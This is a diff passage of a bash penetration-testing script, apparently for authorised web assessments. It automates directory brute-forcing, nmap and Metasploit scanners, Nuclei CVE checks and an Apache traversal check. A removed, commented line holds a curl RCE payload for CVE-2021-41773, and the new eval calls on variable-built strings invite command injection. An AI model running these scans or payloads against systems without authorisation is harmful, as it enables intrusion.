@@ -343,347 +343,426 @@ function waitWeb (){
 	  done
 	  ##############################
 }
+function enumeracionDefecto() {
+    proto_http=$1
+    host=$2
+    port=$3
 
-function enumeracionDefecto () {
-   proto_http=$1
-   host=$2
-   port=$3
+    echo -e "\t[+] Default enumeration ($proto_http : $host : $port)"
 
+    waitWeb 0.3
 
-   echo -e "\t[+] Default enumeration ($proto_http : $host : $port)"
-   waitWeb 0.3
-   egrep -qiv "AngularJS|BladeSystem|cisco|Cloudflare|Coyote|Express|GitLab|GoAhead-Webs|Nextcloud|Always200-OK|Open Source Routing Machine|oracle|Outlook|owa|ownCloud|Pfsense|Roundcube|Router|SharePoint|Taiga|Zentyal|Zimbra" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
-   greprc=$?
-	if [[ $greprc -eq 0  ]];then
+    egrep -qiv "AngularJS|BladeSystem|cisco|Cloudflare|Coyote|Express|GitLab|GoAhead-Webs|Nextcloud|Always200-OK|Open Source Routing Machine|oracle|Outlook|owa|ownCloud|Pfsense|Roundcube|Router|SharePoint|Taiga|Zentyal|Zimbra" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
+    greprc=$?
 
-		#1: si no existe log
-   		if [[ ! -e "logs/vulnerabilidades/${host}_${port}-${path_web_sin_slash}_apacheNuclei.txt" ]]; then
-			waitWeb 0.3
-			echo -e "\t\t[+] Revisando paneles administrativos ($host - default)"
-			$proxychains web-buster -target $host -port $port  -proto $proto_http -path $path_web -module admin -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt &
+    if [[ $greprc -eq 0 ]]; then
+        #1: si no existe log
+        if [[ ! -e "logs/vulnerabilidades/${host}_${port}-${path_web_sin_slash}_apacheNuclei.txt" ]]; then
+            waitWeb 0.3
+            echo -e "\t\t[+] Revisando paneles administrativos ($host - default)"
+            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module admin -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+            echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt
+            eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt &
 
-			waitWeb 0.3
-			echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - default)"
-			checkerWeb.py --tipo phpinfo --url $proto_http://$host:$port/ > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_phpinfo.txt &
-			web-buster -target $host -port $port  -proto $proto_http -path $path_web -module information -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt &
+            waitWeb 0.3
+            echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - default)"
+            checkerWeb.py --tipo phpinfo --url $proto_http://$host:$port/ > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_phpinfo.txt &
+            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module information -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+            echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt
+            eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt &
 
-			waitWeb 0.3
-			echo -e "\t\t[+] Revisando archivos peligrosos ($host - default)"
-			web-buster -target $host -port $port  -proto $proto_http -path $path_web -module archivosPeligrosos -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt &
-		fi
+            waitWeb 0.3
+            echo -e "\t\t[+] Revisando archivos peligrosos ($host - default)"
+            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module archivosPeligrosos -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+            echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt
+            eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt &
+        fi
 
+        if [[ "$MODE" == "total" || ! -z "$URL" ]]; then
+            egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
+            greprc=$?
 
-		if [[ "$MODE" == "total" || ! -z "$URL" ]]; then
+            if [[ $greprc -eq 1 ]]; then
+                waitWeb 0.3
+                echo -e "\t\t[+] Revisando folders ($host - default)"
+                command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+                echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt
+                eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt &
+            fi
 
-			egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
-			greprc=$?
-			if [[ $greprc -eq 1 ]]; then
-				waitWeb 0.3
-				echo -e "\t\t[+] Revisando folders ($host - default)"
-				$proxychains web-buster -target $host -port $port  -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt &
-			fi
+            waitWeb 0.3
+            echo -e "\t\t[+] Revisando backups de archivos genericos ($host - default)"
+            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module files -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+            echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt
+            eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt &
 
-			waitWeb 0.3
-			echo -e "\t\t[+] Revisando backups de archivos genericos ($host - default)"
-			$proxychains web-buster -target $host -port $port  -proto $proto_http -path $path_web -module files -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt &
-
-			waitWeb 0.3
-			echo -e "\t\t[+] Revisando archivos por defecto ($host - default)"
-			web-buster -target $host -port $port  -proto $proto_http -path $path_web -module default -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt &
-		fi
-
-
-	fi
+            waitWeb 0.3
+            echo -e "\t\t[+] Revisando archivos por defecto ($host - default)"
+            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module default -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+            echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt
+            eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt &
+        fi
+    fi
 }
 
-function enumeracionSharePoint () {
-   proto_http=$1
-   host=$2
-   port=$3
+function enumeracionSharePoint() {
+    proto_http=$1
+    host=$2
+    port=$3
 
-	#1: si no existe log
-   	if [[ ! -e "logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_SharePoint.txt" ]]; then
-		echo -e "\t[+] Enumerar Sharepoint ($proto_http : $host : $port)"
+    #1: si no existe log
+    if [[ ! -e "logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_SharePoint.txt" ]]; then
+        echo -e "\t[+] Enumerar Sharepoint ($proto_http : $host : $port)"
+        if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"* && ${host} != *"autodiscover"* ]]; then
+            echo -e "\t\t[+] Revisando directorios comunes ($host - SharePoint)"
+            waitWeb 0.3
+            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 -error404 'something went wrong'"
+            echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt
+            eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt &
+        fi
 
-		if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"*  && ${host} != *"autodiscover"* ]];then
-			echo -e "\t\t[+] Revisando directorios comunes ($host - SharePoint)"
-			waitWeb 0.3
-			$proxychains web-buster -target $host -port $port  -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 -error404 'something went wrong' >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt &
-		fi
-
-		waitWeb 0.3
-		echo -e "\t\t[+] Revisando archivos comunes de sharepoint ($host - SharePoint)"
-		echo "web-buster -target $host -port $port  -proto $proto_http -path $path_web -module sharepoint -threads $hilos_web -redirects 0 -show404 -error404 'something went wrong'" > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_SharePoint.txt
-		$proxychains web-buster -target $host -port $port  -proto $proto_http -path $path_web -module sharepoint -threads $hilos_web -redirects 0 -show404 -error404 'something went wrong' >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_SharePoint.txt &
-	fi
+        waitWeb 0.3
+        echo -e "\t\t[+] Revisando archivos comunes de sharepoint ($host - SharePoint)"
+        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module sharepoint -threads $hilos_web -redirects 0 -show404 -error404 'something went wrong'"
+        echo $command > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_SharePoint.txt
+        eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_SharePoint.txt &
+    fi
 }
 
-function enumeracionIIS () {
-   proto_http=$1
-   host=$2
-   port=$3
+function enumeracionIIS() {
+    proto_http=$1
+    host=$2
+    port=$3
 
-  	#1: si no existe log
-   	if [[ ! -e "logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt"  ]]; then
-		echo -e "\t[+] Enumerar IIS ($proto_http : $host : $port)"
-		egrep -iq "IIS/6.0|IIS/5.1" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
-		IIS6=$?
-		if [[ $IIS6 -eq 0 ]];then
-			echo -e "\t\t[+] Detectado IIS/6.0|IIS/5.1 - Revisando vulnerabilidad web-dav ($host - IIS)"
-			echo "$proxychains  nmap -Pn -n -sT -p $port --script=http-iis-webdav-vuln $host" >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_IISwebdavVulnerable.txt 2>/dev/null
-			$proxychains nmap -Pn -n -sT -p $port --script=http-iis-webdav-vuln $host >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_IISwebdavVulnerable.txt 2>/dev/null &
-		fi
+    #1: si no existe log
+    if [[ ! -e "logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt" ]]; then
+        echo -e "\t[+] Enumerar IIS ($proto_http : $host : $port)"
+        egrep -iq "IIS/6.0|IIS/5.1" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
+        IIS6=$?
+        if [[ $IIS6 -eq 0 ]]; then
+            echo -e "\t\t[+] Detectado IIS/6.0|IIS/5.1 - Revisando vulnerabilidad web-dav ($host - IIS)"
+            echo "$proxychains  nmap -Pn -n -sT -p $port --script=http-iis-webdav-vuln $host" >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_IISwebdavVulnerable.txt 2>/dev/null
+            $proxychains nmap -Pn -n -sT -p $port --script=http-iis-webdav-vuln $host >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_IISwebdavVulnerable.txt 2>/dev/null &
+        fi
 
-		echo -e "\t\t[+] Revisando paneles administrativos ($host - IIS)"
-		$proxychains web-buster -target $host -port $port  -proto $proto_http -path $path_web -module admin -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt &
+        echo -e "\t\t[+] Revisando paneles administrativos ($host - IIS)"
+        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module admin -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt
+        eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt &
 
-		waitWeb 0.3
-		echo -e "\t\t[+] Revisando archivos peligrosos ($host - IIS)"
-		web-buster -target $host -port $port  -proto $proto_http -path $path_web -module archivosPeligrosos -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt &
+        waitWeb 0.3
+        echo -e "\t\t[+] Revisando archivos peligrosos ($host - IIS)"
+        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module archivosPeligrosos -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt
+        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt &
 
-		waitWeb 0.3
-		echo -e "\t\t[+] Revisando archivos genericos ($host - IIS)"
-		web-buster -target $host -port $port  -proto $proto_http -path $path_web -module files -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt &
+        waitWeb 0.3
+        echo -e "\t\t[+] Revisando archivos genericos ($host - IIS)"
+        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module files -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt
+        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt &
 
-		waitWeb 0.3
-		echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - IIS)"
-		web-buster -target $host -port $port  -proto $proto_http -path $path_web -module webserver -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webserver.txt &
+        waitWeb 0.3
+        echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - IIS)"
+        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module webserver -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webserver.txt
+        eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webserver.txt &
 
-		waitWeb 0.3
-		echo -e "\t\t[+] Revisando archivos comunes de webservices ($host - IIS)"
-		web-buster -target $host -port $port  -proto $proto_http -path $path_web -module webservices -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_openWebservice.txt &
-	fi
+        waitWeb 0.3
+        echo -e "\t\t[+] Revisando archivos comunes de webservices ($host - IIS)"
+        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module webservices -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_openWebservice.txt
+        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_openWebservice.txt &
+    fi
 
+    if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"* && ${host} != *"autodiscover"* ]]; then
+        egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
+        greprc=$?
+        if [[ $greprc -eq 1 ]]; then
 
-	if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"*  && ${host} != *"autodiscover"* ]];then
-		egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
-		greprc=$?
-		if [[ $greprc -eq 1 ]]; then
+            if [[ "$MODE" == "total" || ! -z "$URL" ]]; then
 
-			if [[  "$MODE" == "total" || ! -z "$URL" ]]; then
+                waitWeb 0.3
+                echo -e "\t\t[+] Revisando directorios comunes ($host - IIS)"
+                waitWeb 0.3
+                command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+                echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt
+                eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt &
 
-				waitWeb 0.3
-				echo -e "\t\t[+] Revisando directorios comunes ($host - IIS)"
-				waitWeb 0.3
-				web-buster -target $host -port $port  -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt &
+                waitWeb 0.3
+                echo -e "\t\t[+] Revisando archivos por defecto ($host - IIS)"
+                command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module default -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+                echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt
+                eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt &
 
-				waitWeb 0.3
-				echo -e "\t\t[+] Revisando archivos por defecto ($host - IIS)"
-				web-buster -target $host -port $port  -proto $proto_http -path $path_web -module default -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt &
-
-				echo -e "\t\t[+] Revisando vulnerabilidad HTTP.sys ($host - IIS)"
-				echo "$proxychains  nmap -p $port --script http-vuln-cve2015-1635.nse $host" >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_HTTPsys.txt
-				$proxychains nmap -n -Pn -p $port --script http-vuln-cve2015-1635.nse $host >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_HTTPsys.txt &
-
-				waitWeb 0.3
+                echo -e "\t\t[+] Revisando vulnerabilidad HTTP.sys ($host - IIS)"
+                echo "$proxychains  nmap -p $port --script http-vuln-cve2015-1635.nse $host" >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_HTTPsys.txt
+                $proxychains nmap -n -Pn -p $port --script http-vuln-cve2015-1635.nse $host >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_HTTPsys.txt &
+                
+                
+                waitWeb 0.3
 				echo -e "\t\t[+] Revisando la existencia de backdoors ($host - IIS)"
-				web-buster -target $host -port $port  -proto $proto_http -path $path_web -module backdoorIIS -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webshell.txt &
+				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module backdoorIIS -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+				echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webshell.txt
+				eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webshell.txt &
 
 				waitWeb 0.3
 				echo -e "\t\t[+] Revisando backups de archivos de configuración ($host - IIS)"
-				web-buster -target $host -port $port  -proto $proto_http -path $path_web -module backupIIS -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_backupweb.txt &
+				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module backupIIS -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+				echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_backupweb.txt
+				eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_backupweb.txt &
 
 				waitWeb 0.3
 				echo -e "\t\t[+] certsrv ($host - IIS)"
-				curl --max-time 10 -s -k -o /dev/null -w "%{http_code}"  "http://"$host"/certsrv/certfnsh.asp"  >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_certsrv.txt &
-
+				command="curl --max-time 10 -s -k -o /dev/null -w '%{http_code}' 'http://$host/certsrv/certfnsh.asp'"
+				echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_certsrv.txt
+				eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_certsrv.txt &
 
 				#iis_shortname_scanner
 				$proxychains msfconsole -x "use auxiliary/scanner/http/iis_shortname_scanner;set RHOSTS $host;exploit;exit" > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_shortname.txt 2>/dev/null &
-			fi  #total
+
+			fi #total
 
 			if [ "$EXTRATEST" == "oscp" ]; then
 				waitWeb 0.3
 				echo -e "\t\t[+] Revisando archivos aspx ($host - IIS)"
-				web-buster -target $host -port $port  -proto $proto_http -path $path_web -module aspx -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_aspx-files.txt &
+				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module aspx -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+				echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_aspx-files.txt
+				eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_aspx-files.txt &
 			fi #oscp
 		fi	#NO CMS
 	fi	#hosting domains
-
 }
 
 
-function enumeracionApache () {
-   proto_http=$1
-   host=$2
-   port=$3
 
-   #1: si no existe log
-   if [[ ! -e "logs/vulnerabilidades/${host}_${port}-${path_web_sin_slash}_apacheNuclei.txt" ]]; then
-		echo -e "\t\t[+] Enumerar Apache ($proto_http : $host : $port)"
-		waitWeb 0.3
-		echo -e "\t\t[+] Nuclei apache $proto_http $host:$port"
-		nuclei -u "$proto_http://$host:$port"  -id /root/.local/nuclei-templates/cves/apache.txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheNuclei.txt &
+function enumeracionApache() {
+    proto_http=$1
+    host=$2
+    port=$3
 
-		waitWeb 0.3
-		echo -e "\t\t[+] Revisando paneles administrativos ($host - Apache/nginx)"
-		command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module admin -threads $hilos_web -redirects 0 -show404 $param_msg_error"
-		echo $command  >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt
-		eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt &
+    #1: si no existe log
+    if [[ ! -e "logs/vulnerabilidades/${host}_${port}-${path_web_sin_slash}_apacheNuclei.txt" ]]; then
+        echo -e "\t\t[+] Enumerar Apache ($proto_http : $host : $port)"
+        waitWeb 0.3
+        echo -e "\t\t[+] Nuclei apache $proto_http $host:$port"
+        command="nuclei -u '$proto_http://$host:$port' -id /root/.local/nuclei-templates/cves/apache.txt -no-color -include-rr -debug"
+        echo $command > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheNuclei.txt
+        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheNuclei.txt 2>&1 &
 
-		waitWeb 0.3
-		echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - Apache/nginx)"
-		checkerWeb.py --tipo phpinfo --url $proto_http://$host:$port/ > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_phpinfo.txt &
-		web-buster -target $host -port $port  -proto $proto_http -path $path_web -module information -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt &
+        waitWeb 0.3
+        echo -e "\t\t[+] Revisando paneles administrativos ($host - Apache/nginx)"
+        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module admin -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt
+        eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt &
 
-		waitWeb 0.3
-		echo -e "\t\t[+] Revisando archivos peligrosos ($host - Apache/nginx)"
-		echo "$proxychains web-buster -target $host -port $port -proto $proto_http -path $path_web -module archivosPeligrosos -threads $hilos_web -redirects 0 -show404 $param_msg_error" >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt
-		$proxychains web-buster -target $host -port $port -proto $proto_http -path $path_web -module archivosPeligrosos -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt &
+        waitWeb 0.3
+        echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - Apache/nginx)"
+        checkerWeb.py --tipo phpinfo --url $proto_http://$host:$port/ > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_phpinfo.txt &
+        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module information -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt
+        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt &
 
-		waitWeb 0.3
-		echo -e "\t\t[+] Revisando archivos genericos ($host - Apache/nginx)"
-		web-buster -target $host -port $port -proto $proto_http -path $path_web -module files -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt &
+        waitWeb 0.3
+        echo -e "\t\t[+] Revisando archivos peligrosos ($host - Apache/nginx)"
+        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module archivosPeligrosos -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt
+        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt &
 
-		waitWeb 0.3
-		echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - Apache/nginx)"
-		web-buster -target $host -port $port -proto $proto_http -path $path_web -module webserver -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webserver.txt &
+        waitWeb 0.3
+        echo -e "\t\t[+] Revisando archivos genericos ($host - Apache/nginx)"
+        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module files -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt
+        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt &
 
-		#  CVE-2021-4177
-		echo -e "\t\t[+] Revisando apache traversal)"
-		$proxychains apache-traversal.py  --target  $host --port $port > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheTraversal.txt 2>/dev/null &
+        waitWeb 0.3
+        echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - Apache/nginx)"
+        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module webserver -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webserver.txt
+        eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webserver.txt &
 
-		waitWeb 0.3
-		echo -e "\t\t[+] Revisando archivos graphQL ($host - Apache/nginx)"
-		web-buster -target $host -port $port -proto $proto_http -path $path_web -module graphQL -threads $hilos_web -redirects 0 -show404 $param_msg_error >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_graphQL.txt &
+        # CVE-2021-4177
+        echo -e "\t\t[+] Revisando apache traversal)"
+        command="$proxychains apache-traversal.py --target $host --port $port"
+        echo $command > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheTraversal.txt
+        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheTraversal.txt 2>&1 &
 
-		# cve-2021-41773
-		#echo -e "\t\t[+] Revisando cve-2021-41773 (RCE)"
-		#$proxychains curl -k --max-time 10 $proto_http://$host:$port/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id' > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cve-2021-41773.txt 2>/dev/null &
+        waitWeb 0.3
